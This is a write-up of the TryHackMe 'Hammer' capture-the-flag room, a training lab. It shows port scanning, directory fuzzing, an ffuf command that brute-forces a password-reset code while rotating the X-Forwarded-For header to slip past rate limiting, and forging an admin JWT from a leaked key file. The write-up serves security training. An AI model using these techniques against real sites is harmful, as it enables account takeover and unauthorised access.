---
layout: post
title: Hammer Challenge
date: 2025-08-16 17:29 +0300
categories: [Challenge,THM]
tags: [Challenge,THM, write-up]
---

# Hammer

link: [https://tryhackme.com/room/hammer](https://tryhackme.com/room/hammer)

In this challenge we need to bypass authentication mechanisms on a website and get RCE.

## What is the flag value after logging in to the dashboard?
After starting the machine, I got the IP: `10.10.137.63`

First things first, let's do a simple `nmap` scan on that IP:
```console
> nmap -sS 10.10.137.63 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 10:43 EDT
Nmap scan report for 10.10.137.63
Host is up (0.078s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 1.48 seconds
```
but it looks like there is no web service that uses port 80, so we need to widen our search with a full port scan:
```console
> nmap -sS -O -sV -v -p- 10.10.137.63 
...
Nmap scan report for 10.10.137.63
Host is up (0.076s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Uptime guess: 5.601 days (since Sun Aug 10 20:25:45 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

After a more thorough scan, we found a web service on port `1337`.\
So let's give `10.10.137.63:1337` a visit:

Note: For easier access, I added the machine's IP to /etc/hosts under the hostname `hammer.thm`.

![](https://i.imgur.com/fEGpFzZ.png)

We have a simple website with a login using email and password, and also a forgot password page.

The Reset Password page:
![](https://i.imgur.com/rGyAXou.png)

Giving the forgot password page a try with `test@test.com`
![](https://i.imgur.com/ShVEIxI.png)
So we need to find a user email we can attack.

Using the Dev Tools on the main page, we can see a note left by the developer that could help:
![](https://i.imgur.com/Oojh3i3.png)

With this knowledge, we can go to the next step and enumerate directories on the site:
```console
> ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://10.10.137.63:1337/hmr_FUZZ

...

css                     [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 78ms]
images                  [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 77ms]
js                      [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 77ms]
logs                    [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 76ms]
:: Progress: [4746/4746] :: Job [1/1] :: 376 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
```

Let's visit the `http://10.10.137.63:1337/hmr_logs/` page to see if we can find anything useful:
![](https://i.imgur.com/Etw9ruJ.png)
![](https://i.imgur.com/9zpRuIQ.png)

Inside the logs, we found a user: `tester@hammer.thm`

Using this email on the reset password page shows that we need to enter a 4-digit recovery code to reset the password.

![](https://i.imgur.com/Qt52m3v.png)

We can generate all possible 4-digit codes from 0000-9999 using crunch:
```console
> crunch 4 4 0123456789 -o 4digit.txt
```
and brute-force the recovery code.
To do so, we need to see what a Submit code request looks like:

```
POST /reset_password.php HTTP/1.1

Host: 10.10.137.63:1337

...

Cookie: PHPSESSID=d1eke70g85ndlr4je3m1ighqra

...

recovery_code=1234&s=178
```

But before we can do that, there is another protection layer we need to address:
![](https://i.imgur.com/tUmAKa8.png)

There is a rate-limiting mechanism after too many failed attempts that we need to bypass.

using [HackTricks](https://book.hacktricks.wiki/en/pentesting-web/rate-limit-bypass.html) 
```
Manipulating IP Origin via Headers

Modifying headers to alter the perceived IP origin can help evade IP-based rate limiting. Headers such as X-Originating-IP, X-Forwarded-For, X-Remote-IP, X-Remote-Addr, X-Client-IP, X-Host, X-Forwared-Host, including using multiple instances of X-Forwarded-For, can be adjusted to simulate requests from different IPs.
```

In this case, `X-Forwarded-For` is the header that bypasses the rate limit (usually this header is supposed to be an IP, but setting anything in it resets the rate limit); using `ffuf` to brute-force the recovery code:

```
ffuf -w codes.txt -u "http://hammer.thm:1337/reset_password.php" -X "POST" -d "recovery_code=FUZZ&s=60" -H "Cookie: PHPSESSID=...." -H "X-Forwarded-For: FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid"
```
Command explanation:
```
-w: Wordlist file
-u: Target URL
-X: HTTP method to use
-d: POST data
-H: Header
-fr: Filter regexp 
```
Filling out the cookie and using the codes as the `X-Forwarded-For` header, I run the command to find the recovery code:
![](https://i.imgur.com/7ggPVYf.png)

The code is `3979`.\
Now let's use it to reset the password for the user:
![](https://i.imgur.com/XuFeBSP.png)
![](https://i.imgur.com/bSMeH8q.png)

After changing the password and logging into the account, we found the first flag:

![](https://i.imgur.com/GEoL5MS.jpeg)

🚩 First flag found! 🚩

## What is the content of the file /home/ubuntu/flag.txt?

After logging into the dashboard, we see a page that states our role: `user` and a command we can submit to run.

While playing around with the dashboard, something weird happened — we got logged out automatically. This is because of a script included with the dashboard:
![](https://i.imgur.com/UHCaJp7.png)

This happened because of a cookie `persistentSession` that is set for `Max-Age=20` (20 seconds), so using Burp Suite to help, we set this number higher so we have time to play around:

![](https://i.imgur.com/5UtY7XP.png)
![](https://i.imgur.com/o0p365Y.png)
![](https://i.imgur.com/pgiqUm1.png)

Using the command form, let's try to get the file `/home/ubuntu/flag.txt`:
![](https://i.imgur.com/vRp77vE.png)

Looks like there is a filter on commands we can use. Trying different methods of printing files, nothing seems to work — the only command we can use is `ls`, and we can see something interesting:
![](https://i.imgur.com/OkGUuTB.png)

there is a key file in the path we are currently in, so if we go to `http://hammer.thm:1337/188ade1.key` we can download it:

![](https://i.imgur.com/YKh7K12.png)

Also, we have a token; maybe we can forge one with higher privileges.\
Taking the token and decoding it:

![](https://i.imgur.com/qdLVQYs.png)

We can set the `kid` to the key we have at `/var/www/html/188ade1.key` and make our own JWT with the admin role so we can get the flag:

![](https://i.imgur.com/kZ0y7Rp.png)

now let's stop a request using burp and change the jwt token to the new one:

![](https://i.imgur.com/L9MThbG.png)

![](https://i.imgur.com/VHhTses.png)

🚩 Second flag found! 🚩